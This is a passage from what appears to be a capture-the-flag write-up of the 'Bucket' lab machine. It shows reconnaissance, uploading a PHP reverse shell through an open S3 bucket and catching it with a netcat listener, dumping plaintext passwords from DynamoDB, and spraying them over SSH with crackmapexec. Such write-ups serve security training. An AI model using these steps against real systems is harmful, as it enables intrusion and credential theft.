<li>AWS CLI - <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Scanning through all the ports return the same result.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
<p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.212
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;
</span></span><span class="line"><span class="cl">&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span class="line"><span class="cl">&lt;p&gt;The document has moved &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
</span></span><span class="line"><span class="cl">&lt;hr&gt;
</span></span><span class="line"><span class="cl">&lt;address&gt;Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.212 Port 80&lt;/address&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb
</span></span></code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
</p>
<p>Inspecting the page source discovers a vhost.</p>
<p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
</p>
<p>I&rsquo;ll add the domain name to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb
</span></span></code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>There&rsquo;s no interesting results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5344<span class="o">]</span>
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> 
</span></span></code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
<p>Visiting the newly discovered hostname displays a typical json output format.</p>
<p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
</p>
<h4 id="gobuster-1">Gobuster</h4>
<p><code>gobuster</code> scan discovers a few web paths.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/shell                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="cl">/health               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 54<span class="o">]</span>
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> 
</span></span></code></pre></div><h4 id="shell">/shell</h4>
<p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
<p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
</p>
<p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ curl -sv http://s3.bucket.htb/shell
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">&lt; refresh: 0<span class="p">;</span> <span class="nv">url</span><span class="o">=</span>http://444af250749d:4566/shell/
</span></span><span class="line"><span class="cl">&lt; access-control-allow-origin: *
</span></span><span class="line"><span class="cl">&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
</span></span><span class="line"><span class="cl">&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
</span></span><span class="line"><span class="cl">&lt; access-control-expose-headers: x-amz-version-id
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host s3.bucket.htb left intact</span>
</span></span></code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</span></span></code></pre></div><p>Searching some of the header names on Google reveals these are used by Amazon S3</p>
<p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
</p>
<p>Adding another <code>/</code> at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.</p>
<p><div class="img-container"><img src="imgs/image-20210424223257481.png" alt="image-20210424223257481"  /></div>
</p>
<h4 id="health">/health</h4>
<p><code>/health</code> is probably an endpoint to monitor the service status.</p>
<p><div class="img-container"><img src="imgs/image-20210422235825937.png" alt="image-20210422235825937"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="aws-s3">AWS S3</h4>
<p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">here</a>.</p>
<p>Usage in general:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">aws [options] s3 &lt;subcommand&gt; [parameters]
</span></span></code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
<blockquote>
<p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 ls --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
</span></span><span class="line"><span class="cl">You must specify a region. You can also configure your region by running <span class="s2">&#34;aws configure&#34;</span>.
</span></span></code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws configure
</span></span><span class="line"><span class="cl">AWS Access Key ID <span class="o">[</span>None<span class="o">]</span>:
</span></span><span class="line"><span class="cl">AWS Secret Access Key <span class="o">[</span>None<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Default region name <span class="o">[</span>None<span class="o">]</span>: us-east-1
</span></span><span class="line"><span class="cl">Default output format <span class="o">[</span>None<span class="o">]</span>:
</span></span></code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 ls --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
</span></span><span class="line"><span class="cl">2020-10-21 09:16:03 adserver
</span></span></code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver --endpoint-url<span class="o">=</span>http://s3.bucket.htb
</span></span><span class="line"><span class="cl">                           PRE images/
</span></span><span class="line"><span class="cl">2020-10-21 09:22:04       <span class="m">5344</span> index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver/images/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
</span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">37840</span> bug.jpg
</span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">51485</span> cloud.png
</span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">16486</span> malware.png
</span></span></code></pre></div><p>These files are the same files seen previously on <code>bucket.htb</code>.</p>
<h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
<p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy">source</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">aws s3 cp &lt;source&gt; &lt;target&gt; <span class="o">[</span>--options<span class="o">]</span>
</span></span></code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test file and upload it to the bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
</span></span><span class="line"><span class="cl">upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</span></span></code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
</span></span><span class="line"><span class="cl">                           PRE images/
</span></span><span class="line"><span class="cl">2021-04-22 14:05:15         <span class="m">21</span> iamf-test.php
</span></span><span class="line"><span class="cl">2021-04-22 14:05:04       <span class="m">5344</span> index.html
</span></span></code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of PHP code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
</span></span><span class="line"><span class="cl">&lt;?php <span class="nb">echo</span> <span class="s2">&#34;IamF&#34;</span> ?&gt;
</span></span><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ curl -s http://bucket.htb/iamf-test.php
</span></span><span class="line"><span class="cl">IamF
</span></span></code></pre></div><p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
</span></span></code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ curl -s http://bucket.htb/iamf.php
</span></span></code></pre></div><p>I have a shell now my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t pop a shell).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.212<span class="o">]</span> <span class="m">58352</span>
</span></span><span class="line"><span class="cl">Linux bucket 5.4.0-48-generic <span class="c1">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class="line"><span class="cl"> 18:14:02 up 13:18,  <span class="m">0</span> users,  load average: 0.03, 0.04, 0.04
</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1050<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@bucket:/$ 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-roy">Shell as roy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p><code>roy</code> is the only user in this box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">roy:x:1000:1000:,,,:/home/roy:/bin/bash
</span></span></code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/var/www$ ls -la /home/roy
</span></span><span class="line"><span class="cl">total <span class="m">44</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 12:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">2</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 12:03 .aws
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> roy  roy     <span class="m">9</span> Sep <span class="m">16</span>  <span class="m">2020</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> roy  roy   <span class="m">220</span> Sep <span class="m">16</span>  <span class="m">2020</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> roy  roy  <span class="m">3771</span> Sep <span class="m">16</span>  <span class="m">2020</span> .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 07:57 .cache
</span></span><span class="line"><span class="cl">drwx------ <span class="m">4</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 08:01 .gnupg
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> roy  roy   <span class="m">807</span> Sep <span class="m">16</span>  <span class="m">2020</span> .profile
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 07:59 project
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 07:59 snap
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> roy  roy    <span class="m">33</span> Apr <span class="m">22</span> 04:56 user.txt
</span></span></code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">44</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> roy roy  <span class="m">4096</span> Sep <span class="m">24</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> roy roy  <span class="m">4096</span> Apr <span class="m">24</span> 17:31 ..
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> roy roy    <span class="m">63</span> Sep <span class="m">24</span>  <span class="m">2020</span> composer.json
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> roy roy <span class="m">20533</span> Sep <span class="m">24</span>  <span class="m">2020</span> composer.lock
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> roy roy   <span class="m">367</span> Sep <span class="m">24</span>  <span class="m">2020</span> db.php
</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">10</span> roy roy  <span class="m">4096</span> Sep <span class="m">24</span>  <span class="m">2020</span> vendor
</span></span></code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ cat db.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">date_default_timezone_set<span class="o">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<span class="p">;</span>
</span></span><span class="line"><span class="cl">use Aws<span class="se">\D</span>ynamoDb<span class="se">\E</span>xception<span class="se">\D</span>ynamoDbException<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> new Aws<span class="se">\S</span>dk<span class="o">([</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;profile&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;default&#39;</span>,
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;region&#39;</span>  <span class="o">=</span>&gt; <span class="s1">&#39;us-east-1&#39;</span>,
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;version&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;latest&#39;</span>,
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;endpoint&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;http://localhost:4566&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dynamodb</span> <span class="o">=</span> <span class="nv">$client</span>-&gt;createDynamoDb<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//todo
</span></span></code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;s3&#34;</span>: <span class="s2">&#34;running&#34;</span>, 
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;dynamodb&#34;</span>: <span class="s2">&#34;running&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
<p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
<p>General usage:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">usage: aws <span class="o">[</span>options<span class="o">]</span> dynamodb &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
</span></span></code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;TableNames&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;users&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Items&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;Management@#1@#&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>,
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;Mgmt&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>,
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;Welcome123!&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>,
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;Cloudadm&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>,
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>,
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;S&#34;</span>: <span class="s2">&#34;Sysadm&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">]</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Count&#34;</span>: 3,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ScannedCount&#34;</span>: 3,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ConsumedCapacity&#34;</span>: null
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>I&rsquo;ll keep those credentials.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh <span class="s1">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>-<span class="o">]</span> roy:Management@#1@# Authentication failed.
</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>-<span class="o">]</span> roy:Welcome123! Authentication failed.
</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>+<span class="o">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</span></span></code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ ssh roy@10.10.10.212
</span></span><span class="line"><span class="cl">roy@10.10.10.212<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-48-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">  System load:                      0.02
